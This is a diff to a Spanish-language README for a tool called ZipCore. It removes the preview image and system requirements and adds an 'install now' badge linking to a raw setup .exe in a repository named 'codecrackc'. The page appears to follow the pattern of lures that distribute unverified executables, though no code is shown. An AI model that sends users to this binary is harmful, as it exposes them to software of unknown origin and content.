@@ -30,30 +30,19 @@ const yo = {
 
 ```
 <p align="center">
-  <img src="fto 3.PNG" 
-       alt="ZipCore Preview" 
-       width="550" 
-       style="border-radius: 16px; box-shadow: 0px 10px 25px rgba(0,0,0,0.3);" />
-</p>
+
+# 📦 INSTALAR ZIPCORE
 
 <br>
 
-<p align="center">
-  <a href="https://github.com/codecrackc/ZIPCORE/raw/main/ZipCore_Gratis_Setup_v1.0.0.exe" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_DESCARGAR_ZIPCORE-00F2FE?style=for-the-badge&logo=windows&logoColor=white&labelColor=0d1117" 
-         alt="Descargar ZipCore" />
-  </a>
+<a href="https://github.com/codecrackc/ZIPCORE/raw/main/ZipCore_Gratis_Setup_v1.0.0.exe" target="_blank">
+  <img src="https://img.shields.io/badge/⬇️_DESCARGAR_AHORA-00F2FE?style=for-the-badge&logo=windows&logoColor=white&labelColor=0d1117" 
+       alt="Descargar ZipCore" />
+</a>
+
 </p>
 
 
-## 🖥️ Requisitos del sistema
-
-| SO           | Windows 10 / 11 (64 bits)          |
-|--------------|-------------------------------------|
-| RAM          | 4 GB mínimo (8 GB recomendado)     |
-| Espacio      | 200 MB libres                      |
-
-<br>
 
 
 <p align="center">
